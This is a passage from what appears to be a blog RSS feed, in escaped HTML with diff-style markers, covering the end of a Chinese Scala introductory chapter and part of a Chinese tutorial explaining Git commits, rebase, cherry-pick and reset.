+&lt;code class=&quot;java language-java hljs&quot; readability=&quot;11&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.chapter01.Test;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;HelloScala&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] paramArrayOfString)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;HelloScala$.MODULE$.main(paramArrayOfString);&lt;br/&gt;}&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;HelloScala&lt;/span&gt;$ &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; HelloScala$ MODULE$;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; {&lt;br/&gt;MODULE$ = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HelloScala$();&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;System.out.println(&lt;span class=&quot;hljs-string&quot;&gt;&quot;hello scala&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h4 id=&quot;h185scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.5 Scala 执行流程分析&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAmS1.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h186scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.6 Scala 程序开发注意事项(重点)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;注意事项：&lt;br/&gt;  1、Scala 源文件以 “.scala&quot; 为扩展名。&lt;br/&gt;  2、Scala 程序的执行入口是 main() 函数。&lt;br/&gt;  3、Scala 语言严格区分大小写。&lt;br/&gt;  4、Scala 方法由一条条语句构成，每个语句后不需要分号(&lt;code&gt;Scala 语言会在每行后自动加分号&lt;/code&gt;)，这也体现出 Scala 的简洁性。&lt;br/&gt;  5、如果在同一行有多条语句，除了最后一条语句不需要分号，其它语句需要分号。&lt;/p&gt;
+&lt;h3 id=&quot;h19scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.9 Scala 语言转义字符&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;pre&gt;
+&lt;code class=&quot;xml language-xml hljs&quot;&gt;\t      ：一个制表位，实现对齐的功能&lt;br/&gt;\n      ：换行符&lt;br/&gt;\\      ：一个\&lt;br/&gt;\&quot;      ：一个&quot;&lt;br/&gt;\r      ：一个回车  println(&quot;hello\rk&quot;); &lt;br/&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;h110scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.10 Scala 语言输出的三种方式&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;  1、字符串通过+号连接（类似java）。&lt;br/&gt;  2、printf 用法（类似C语言）字符串通过 % 传值。&lt;br/&gt;  3、字符串通过 $ 引用（类似PHP）。&lt;br/&gt;示例代码：&lt;/p&gt;
+&lt;pre readability=&quot;11&quot;&gt;
+&lt;code class=&quot;scala language-scala&quot; readability=&quot;16&quot;&gt;package com.atguigu.chapter01&lt;p&gt;/**&lt;br/&gt;* @author chenmingjun&lt;br/&gt;*         2019-03-22 19:14&lt;br/&gt;*/&lt;br/&gt;object PrintDemo {&lt;/p&gt;&lt;p&gt;def main(args: Array[String]): Unit = {&lt;br/&gt;val str1: String = &quot;hello&quot;&lt;br/&gt;val str2: String = &quot;world&quot;&lt;br/&gt;// 连接打印&lt;br/&gt;println(str1 + str2)&lt;/p&gt;&lt;p&gt;val name: String = &quot;tom&quot;&lt;br/&gt;val age: Int = 10&lt;br/&gt;val sal: Float = 10.67f&lt;br/&gt;val height: Double = 180.75&lt;br/&gt;// 格式化输出&lt;br/&gt;printf(&quot;名字=%s 年龄=%d 薪水=%.2f 身高=%.3f&quot;, name, age, sal, height)&lt;/p&gt;&lt;p&gt;// scala 支持使用 $ 输出内容&lt;br/&gt;println(s&quot;个人信息如下1：\n 名字$name\n 年龄$age\n 薪水$sal\n&quot;)&lt;br/&gt;// 如果字符串中出现了类似 ${age + 10} ，则表示 {} 是一个表达式&lt;br/&gt;println(s&quot;个人信息如下2：\n 名字${name}\n 年龄${age + 10}\n 薪水${sal}\n&quot;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;输出结果：&lt;/p&gt;
+&lt;pre readability=&quot;4&quot;&gt;
+&lt;code class=&quot;hljs nginx&quot; readability=&quot;2&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;helloworld&lt;/span&gt;&lt;br/&gt;名字=tom 年龄=&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt; 薪水=&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;67&lt;/span&gt; 身高=&lt;span class=&quot;hljs-number&quot;&gt;180&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;750&lt;/span&gt;&lt;br/&gt;个人信息如下&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;：&lt;br/&gt;名字tom&lt;br/&gt;年龄&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;&lt;br/&gt;薪水&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;67&lt;/span&gt;&lt;p&gt;个人信息如下&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;：&lt;br/&gt;名字tom&lt;br/&gt;年龄&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;&lt;br/&gt;薪水&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;67&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;h111scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.11 Scala 源码的查看的关联&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;  在使用 scala 过程中，为了搞清楚 scala 底层的机制，需要查看源码，下面看看如果关联和查看 scala 的源码包。&lt;br/&gt;1、查看源码, 选择要查看的方法或者类, 输入 Ctrl + B 或者 双击&lt;br/&gt;当我们没关联源码时，会看到如下图：&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAlwD.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;我么可以点击 &lt;strong&gt;Download…&lt;/strong&gt; 自动下载源码，也可以手动关联源码。
+&lt;p&gt;2、手动关联源码&lt;br/&gt;源码包下载地址：https://www.scala-lang.org/download/2.11.8.html，修改我们下载的源码包 scala-2.11.8.tar.gz 包名为 scala-sources-2.11.8.tar.gz，为了方便识别&lt;br/&gt;步骤一：将我们的源码包拷贝至 scala/lib 文件夹下（scala-sources-2.11.8.tar.gz），这样为了方便管理，然后进行解压（因为 IDEA 不识别 xxx.tar.gz 这种格式的压缩包）&lt;br/&gt;步骤二：关联即可，点击 Attach Sources…，选中 scala-sources-2.11.8 这个文件夹，进行关联，最后，可以看到源码&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAKOK.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h112&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12 注释&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;h4 id=&quot;h1121&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.1 介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;blockquote readability=&quot;7&quot;&gt;
+&lt;p&gt;  用于注解说明解释程序的文字就是注释，注释提高了代码的阅读性。&lt;br/&gt;  注释是一个程序员必须要具有的良好编程习惯。将自己的思想通过注释先整理出来，再用代码去体现。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&quot;h1122scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.2 Scala 中的注释类型&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  1、单行注释：格式：// 注释文字&lt;br/&gt;  2、多行注释：格式： /* 注释文字 */&lt;br/&gt;  3、文档注释：注释内容可以被工具 scaladoc 所解析，生成一套以网页文件形式体现的该程序的说明文档。&lt;/p&gt;
+&lt;h4 id=&quot;h1123&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.3 文档注释案例&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  1、打开文件所在的目录，选中文件右键 -&amp;gt; Show in Explorer&lt;br/&gt;  2、在命令行窗口中输入 &lt;code&gt;scaladoc -d d:/mydoc Comment.scala&lt;/code&gt; 可以生成对应的文档说明。&lt;br/&gt;示例代码如下：&lt;/p&gt;
+&lt;pre readability=&quot;6.5&quot;&gt;
+&lt;code class=&quot;scala language-scala&quot; readability=&quot;7&quot;&gt;package com.atguigu.chapter01&lt;p&gt;/**&lt;br/&gt;* 文档注释案例&lt;br/&gt;* @author chenmingjun&lt;br/&gt;*         2019-03-23 0:22&lt;br/&gt;*/&lt;br/&gt;object Comment {&lt;br/&gt;def main(args: Array[String]): Unit = {&lt;br/&gt;println(&quot;hello world&quot;)&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;/**&lt;br/&gt;* @deprecated 过期&lt;br/&gt;* @example&lt;br/&gt;*          输入 n1 = 10 n2 = 20 return 30&lt;br/&gt;* @param n2&lt;br/&gt;* @return 求和&lt;br/&gt;*/&lt;br/&gt;def sum(n1: Int, n2: Int): Int = {&lt;br/&gt;return n1 + n2&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h4 id=&quot;h1124scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.4 scala 的代码规范说明&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;h1125&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.5 正确的注释和注释风格&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  查看 Scala 源码。&lt;/p&gt;
+&lt;h4 id=&quot;h1126&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.6 正确的缩进和空白&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  1、使用一次 tab 操作，实现缩进，默认整体向右边移动，使用 Shift + Tab 整体向左移。&lt;br/&gt;  2、或者使用 Ctrl + Alt + L 来进行格式化代码。&lt;br/&gt;  3、运算符两边习惯性各加一个空格。比如：2 + 4 * 5。&lt;br/&gt;  4、一行最长不超过 80 个字符，超过的请使用换行展示，尽量保持格式优雅。&lt;/p&gt;
+&lt;h4 id=&quot;h1127scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.12.7 Scala 官方编程指南&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;API 下载地址：https://www.scala-lang.org/download/2.11.8.html&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGA1Te.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h113&quot;&gt;&lt;span&gt;&lt;strong&gt;1.13 本章知识回顾&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;&lt;li&gt;&lt;span&gt;Scala 语言的 sdk 是什么？答：Scala 的类库。&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;Scala 环境变量配置及其作用。&lt;br/&gt;配置 &lt;code&gt;SCALA_HOME=D:\learn\Scala\scala-2.11.8&lt;/code&gt;&lt;br/&gt;配置 &lt;code&gt;Path=%SCALA_HOME%\bin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Scala 程序的编写、编译、运行步骤是什么？能否一步执行?？&lt;br/&gt;编写：就是使用工具，开发 scala 程序。&lt;br/&gt;编译：就是将 .scala 文件编译成 .class 【命令：scalac]】。&lt;br/&gt;运行：就是使用 scala 来将 .class 文件加载到 jvm 并运行，可以直接运行 .scala, 但是速度慢。【命令：scala xxx.scala】。&lt;/li&gt;
+&lt;li&gt;Scala 程序编写的规则。&lt;br/&gt;// 规范基本上和 java 类似。但是语句后面不需要加上分号。&lt;/li&gt;
+&lt;li&gt;&lt;span&gt;简述：在配置环境、编译、运行各个步骤中常见的错误。&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+<pubDate>Sat, 23 Mar 2019 01:29:00 +0000</pubDate>
+<dc:creator>黑泽君</dc:creator>
+<og:description>第一章 Scala 语言概述1.1 why is Scala 语言?1.2 Scala 语言诞生小故事1.3 Scala 和 Java 以及 jvm 的关系分析图1.4 Scala 语言的特点1.5</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/chenmingjun/p/10582571.html</dc:identifier>
+</item>
+<item>
+<title>深入理解Git - 一切皆commit - J.晒太阳的猫</title>
+<link>http://www.cnblogs.com/jasongrass/p/10582449.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/jasongrass/p/10582449.html</guid>
+<description>&lt;p&gt;在对 git 有了基本理解和知道常规操作之后，如何对 git 的使用有进一步的理解？&lt;br/&gt;&lt;strong&gt;一切皆 commit&lt;/strong&gt; 或许是个不错的理解思路。&lt;/p&gt;
+&lt;p&gt;本文将从『一切皆 commit 』的角度，通过 git 中常见的名词，如 commit, branch, tag, HEAD 和动词，如 cherry-pick, rebase, reset, revert, stash 来理解 git。通过这些理解，期望能够更好地处理使用 git 中遇到的问题。&lt;/p&gt;
+&lt;p&gt;比如：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;1 做了两个提交的修改，然后删掉分支了，过会发现刚才两个提交有价值，怎么找回来？&lt;br/&gt;&lt;/li&gt;
+&lt;li&gt;2 基于当前 release 分支开发功能，中途误合并了 dev 分支，&lt;br/&gt;然后又进行了几次提交，怎么取消合并dev的操作？&lt;/li&gt;
+&lt;li&gt;3 rebase(变基)究竟是什么意思？&lt;br/&gt;等等。&lt;/li&gt;
+&lt;/ul&gt;&lt;blockquote readability=&quot;5.2824074074074&quot;&gt;
+&lt;p&gt;配合希沃白板课件食用，效果更佳：&lt;br/&gt;【希沃白板5】课件分享 : 《Git 进阶 - 从使用角度深入理解Git》&lt;br/&gt;&lt;a href=&quot;https://r302.cc/ke8XdO?platform=enpc&amp;amp;channel=copylink&quot; class=&quot;uri&quot;&gt;https://r302.cc/ke8XdO?platform=enpc&amp;amp;channel=copylink&lt;/a&gt;&lt;br/&gt;点击链接直接预览课件&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;commit-的原子性&quot;&gt;1 commit 的原子性&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083138379-1587403102.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;在 git 中有工作区，暂存区和代码仓库三个概念，那为什么要有暂存区呢？为了保证提交的原子性，在 git 的应用层面上，提交（commit，名词）是 git 主要命令的操作的最小单位了。&lt;/p&gt;
+&lt;p&gt;关于此，可以查看这篇知乎贴：&lt;a href=&quot;https://www.zhihu.com/question/19946553/answer/29033220&quot;&gt;为什么要先 git add 才能 git commit ？ - Ivony的回答 - 知乎&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;本文中的内容很少涉及工作区和暂存区的操作，有了 commit 是 git 操作的基本单位这个概念，接下来将从『一切皆 commit』来理解 git。&lt;/p&gt;
+&lt;hr/&gt;&lt;h2 id=&quot;一切皆-commit-名词部分&quot;&gt;2 一切皆 commit ：名词部分&lt;/h2&gt;
+&lt;h3 id=&quot;本地仓库&quot;&gt;2.1 本地仓库&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083154056-201275795.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;如上图，其实比较好理解，我们知道 commit 有一个 commit id，另外还是 branch（分支），tag（标签），HEAD（当前分支头结点）这些概念。他们都是指向某个提交的引用（或者理解为指针）。&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;branch（分支）：指向你当前工作分支的最新的那个提交，当在当前分支有了新的提交，则 git 自动更新这个分支指针，以指向最新的提交。&lt;br/&gt;&lt;/li&gt;
+&lt;li&gt;tag（标签）：对某个提交或者分支打 tag 之后，将固定指向那个提交，后续即使分支有更新甚至删除，tag 所指向的提交不变，且一直存在。&lt;/li&gt;
+&lt;li&gt;HEAD（头结点）：指向当前工作的分支，即 HEAD 是当前分支的一个引用，如果切换了分支，HEAD 随之更新。&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;如此，便理解了，branch，tag，HEAD 这些，本质上都是指向某个提交的引用，即：一切都是 commit 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083201728-315630840.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083206523-305894676.png&quot;/&gt;&lt;/p&gt;
+&lt;h3 id=&quot;远端仓库&quot;&gt;2.2 远端仓库&lt;/h3&gt;
+&lt;p&gt;有一个引用，需要单独说明，就是 origin/branch ，通常称之为远程分支，那这个远程分支指向哪里呢？&lt;br/&gt;如何在 『一切皆commit』 这句咒语下理解远程仓库？&lt;/p&gt;
+&lt;p&gt;以 master 分支为例，origin/master 指向的，就是当前远端 master 分支最新的那个提交。等等，其实这句话有点小问题，应该是最后一次更新本地仓库时，远端 master 分支最新的那个提交。那什么时候会更新远程仓库？在执行 pull push fetch 时更新。&lt;/p&gt;
+&lt;p&gt;你或许听说过 git pull = git fetch + git merge 的说法。&lt;br/&gt;当执行 &lt;code&gt;git fetch&lt;/code&gt; 命令时，只更新 origin/master 分支（包括所有其它的 origin 远端分支），但并不会影响本地的任何分支。&lt;/p&gt;
+&lt;p&gt;那要更新本地的 master 分支怎么办？ &lt;code&gt;git merge origin/master&lt;/code&gt; ，将远端的分支合并到本地分支，即完成了对本地 master 分支的更新。所以，实际上，git pull = git fetch + git merge 。&lt;br/&gt;&lt;code&gt;(@master)git pull = git fetch &amp;amp; git merge origin/master&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;案例&lt;/p&gt;
+&lt;p&gt;你在 f/table 分支开发功能，现在需要合并最新dev，可以怎么做？&lt;/p&gt;
+&lt;p&gt;刚学 git 时，可能会这么做：&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;code&gt;(@f/table) git checkout dev
+(@dev) git pull 
+(@dev) git checkout f/table
+(@f/table) git merge dev&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;实际上，不需要切到 dev 分支，先更新 dev，则合并。以下命令即可：&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;code&gt;(@f/table) git fetch
+(@f/table) git merge origin/dev&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;小结：origin/branch 是指向此分支云端最新提交的引用（最新=最后一次更新），在执行 fetch pull push 指令时自动更新。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083221507-1149417730.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;可以使用 git show 命令查看一个提交的详细信息，&lt;br/&gt;因为 commitId/HEAD/branch/tag/origin-branch 这些都是指向一个提交，所以 show 命令后面写任意一个都可以。&lt;br/&gt;另外，还可以使用其他参数控制显示内容，这里不展开。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;git show commitId/HEAD/branch/tag/origin-branch --format=short &lt;/code&gt;
+&lt;/pre&gt;
+&lt;hr/&gt;&lt;h2 id=&quot;一切皆-commit-动词部分&quot;&gt;3 一切皆 commit ：动词部分&lt;/h2&gt;
+&lt;h3 id=&quot;cherry-pick&quot;&gt;3.1 cherry-pick&lt;/h3&gt;
+&lt;p&gt;cherry-pick 比较好理解，就是将一个指定提交的修改摘取过来，举例：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083234935-344620336.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;如图，6 提交是增加一个有用的 helper 类（间接说明，一个 commit 最好功能独立），但你不想将整个分支合并过来，就可以使用 cherry-pick 命令。使用任何一个指向 6 提交的引用都可以。&lt;br/&gt;需要说明的是，cherry-pick 过来的提交，只是内容与之前的提交一样，他们是两个不同的提交。&lt;/p&gt;
+&lt;p&gt;案例&lt;/p&gt;
+&lt;p&gt;做了两个提交的修改，然后删掉分支了，过会发现刚才两个提交有价值，怎么找回来？&lt;/p&gt;
+&lt;p&gt;Step1 使用 &lt;code&gt;git reflog&lt;/code&gt; 查看之前的提交历史，找到需要找回的提交ID。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083245929-1937252833.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;Step2 使用 cherry-pick 命令将需要的提交摘取出来即可。&lt;/p&gt;
+&lt;p&gt;如何丢失的提交比较多，除了可以批量 cherry-pick 之外，根据实际情况，可以直接在那些提交的最新提交上，新建一个分支，那些提交在此之前的所有提交，都在新的分支上了。&lt;/p&gt;
+&lt;p&gt;新建分支(03620f1 指提交号/commit id)：&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;git branch newbranch 03620f1
+git checkout -b newbranch 03620f1&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h3 id=&quot;rebase&quot;&gt;3.2 rebase&lt;/h3&gt;
+&lt;p&gt;如果用一句话理解 rebase 的话，就是：rebase = 一连串自动的 cherry-pick 。&lt;/p&gt;
+&lt;p&gt;关于 rebase ，需要回答三个问题：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;为什么推荐使用 rebase 而不是 merge？&lt;/li&gt;
+&lt;li&gt;为什么听说过使用 rebase 会被打？&lt;/li&gt;
+&lt;li&gt;使用 rebase 有什么问题(什么情况不用 rebase )？&lt;/li&gt;
+&lt;/ul&gt;&lt;h4 id=&quot;rebase-究竟是什么意思&quot;&gt;rebase 究竟是什么意思？&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083302963-712201043.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;如上图，假设 dev 上的提交是 1-2-3-4-5，f/table 分支上的提交是 1-2-3-6-7。现在我们需要合并 dev，通常，会使用 &lt;code&gt;(@f/table)git merge dev&lt;/code&gt; 的方式合并。这里，我们使用 rebase 来合并 dev 。&lt;/p&gt;
+&lt;p&gt;首先，rebase 会找到 dev 和 f/table 共同的父提交，即 3 提交。然后以 dev 最新的提交为基础，把 f/table 分支上新的提交（这里就是 6 和 7），逐个 cherry-pick 过来。形成新的 f/table 分支。&lt;/p&gt;
+&lt;p&gt;注意，整个过程中，对 dev 分支不会有任何影响，因为你是在 f/table 上进行的操作。所有，rebase 的中文翻译，变基，就可以理解为：变基：用 cherry-pick 的方式，给 f/table 上的新提交，换一个基，将基从之前的 3 换到了 dev 所指的提交 5 上。&lt;/p&gt;
+&lt;h4 id=&quot;问题1-为什么推荐使用-rebase-而不是-merge&quot;&gt;问题1 为什么推荐使用 rebase 而不是 merge？&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083314850-699492472.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;当使用 merge 时，提交历史如右侧所示，使用 rebase 的提交历史如下侧所示。&lt;br/&gt;提交历史更清晰，当分支非常多时，回溯提交与查找问题更容易。&lt;/p&gt;
+&lt;h4 id=&quot;问题2-为什么听说过使用-rebase-会被打&quot;&gt;问题2 为什么听说过使用 rebase 会被打&lt;/h4&gt;
+&lt;p&gt;使用 rebase 会修改提交历史，上面的例子中，6和7提交将不在 f/table 分支上存在，取而代之的是8和9分支，在协作分支上，如果6和7已经存在于远端仓库（即别人可能已经基于此有了新的修改），再将6和7移除，将带来诸多冲突与合并的麻烦。（这是，你 push 时，也需要强推，在协作分支上强推，是很危险的行为。）&lt;br/&gt;所以：rebase只对本地未推送的commit上或自己的分支上进行。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083321799-463379180.png&quot;/&gt;&lt;/p&gt;
+&lt;h4 id=&quot;问题3-使用-rebase-有什么问题什么情况不用-rebase&quot;&gt;问题3 使用 rebase 有什么问题(什么情况不用 rebase )&lt;/h4&gt;
+&lt;p&gt;使用 rebase 的收益：更简洁清晰易回溯的提交历史。&lt;/p&gt;
+&lt;p&gt;使用 rebase 的代价：逐个 cherry-pick ，如果有冲突，需要逐个解冲突，使合并变复杂。&lt;/p&gt;
+&lt;p&gt;以合并 dev 分支为例，当工作分支已经做了大量修改（有很多提交，预期有许多冲突），或者之前 merge 过 dev。则建议使用 merge 的方式合并 dev。&lt;/p&gt;
+&lt;p&gt;rebase 小结：&lt;br/&gt;rebase : 一连串的 cherry-pick。（移花接木）&lt;/p&gt;
+&lt;h3 id=&quot;reset&quot;&gt;3.3 reset&lt;/h3&gt;
+&lt;p&gt;reset，重置，将当前分支的状态（这里指工作区，暂存区，代码仓库）重置到指定的状态。reset 的语法如下图，第一个参数是重置方式，后面是一个指向提交的引用（可以是提交ID，分支，tag，HEAD~1等等）。&lt;/p&gt;
+&lt;p&gt;与 rebase 一样，reset 只对当前分支和工作区，暂存区的数据有影响，对参数中指定的引用没有影响。即 &lt;code&gt;(@f/table)git reset --hard dev&lt;/code&gt; 这句命令，影响的是 f/table 分支，对 dev 没有任何影响。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083330496-1978858975.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;具体来看：&lt;/p&gt;
+&lt;h4 id=&quot;git-reset---hard&quot;&gt;git reset --hard&lt;/h4&gt;
+&lt;p&gt;从参数名可以猜到，这个重置方式比较“强硬”，实际上就是，将当前分支，重置到与指定引用一样的状态，丢弃在这之后的提交，以及工作区和暂存区的提交。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083336218-33263985.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;未追踪的文件是不受影响的，PS：git clean 命令会清除掉未追踪的文件。&lt;/p&gt;
+&lt;p&gt;案例1&lt;/p&gt;
+&lt;p&gt;(@f/table)git reset --hard f/table~2 的含义？&lt;/p&gt;
+&lt;p&gt;当前在 f/table 分支，将其重置到 f/table~2 ，结果就是：丢弃掉 f/table 最新的两个提交。&lt;/p&gt;
+&lt;p&gt;案例2&lt;/p&gt;
+&lt;p&gt;将当前分支重置到远端最新 dev 的状态，怎么做？&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(@f/table)git fetch&lt;/code&gt;&lt;br/&gt;&lt;code&gt;(@f/table)git reset --hard origin/dev&lt;/code&gt;&lt;br/&gt;注意，这里需要先 fetch 一下远程仓库，更新 origin/dev 分支。&lt;/p&gt;
+&lt;h4 id=&quot;git-reset---soft---mixed&quot;&gt;git reset --soft / --mixed&lt;/h4&gt;
+&lt;p&gt;理解了 --hard 的含义，--soft 和 --mixed 就很好理解了，这两个参数，不会丢弃任何内容。&lt;/p&gt;
+&lt;p&gt;--soft 会将指定提交之后的提交内容，都放到 暂存区，同理，--mixed 会将指定提交之后的提交内容，以及暂存区中的内容，放到工作区。&lt;/p&gt;
